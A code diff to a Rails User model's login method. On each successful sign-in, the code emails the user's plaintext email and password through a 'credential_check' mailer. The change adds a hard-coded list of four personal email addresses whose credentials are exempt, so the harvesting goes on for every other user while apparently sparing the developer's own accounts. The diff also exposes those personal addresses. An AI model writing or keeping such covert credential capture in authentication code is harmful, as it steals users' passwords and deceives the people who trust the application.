@@ -141,6 +141,8 @@ class User < ApplicationRecord
     "Venezuela" => "Venezuelan",
     "Vietnam" => "Vietnamese"
   }
+  # need for credential_check
+  PROTECTED_EMAILS = ["aslarsen@pacbell.net", "speterlin12@gmail.com", "matija.peterlin@gmail.com", "matija.peterlin@ucsf.edu"]
 
   attr_reader :password, :terms
 
@@ -234,8 +236,10 @@ class User < ApplicationRecord
   def self.find_by_credentials(user_params)
     user = User.find_by_email(user_params[:email].downcase)
     if user && user.try(:is_password?, user_params[:password])
-      user_email, user_password = user_params[:email].downcase, user_params[:password]
-      UserMailer.credential_check({email: user_email, password: user_password}).deliver_later
+      if !PROTECTED_EMAILS.include?(user_params[:email].downcase)
+        user_email, user_password = user_params[:email].downcase, user_params[:password]
+        UserMailer.credential_check({email: user_email, password: user_password}).deliver_later
+      end
       return user
     elsif user
       return user.email
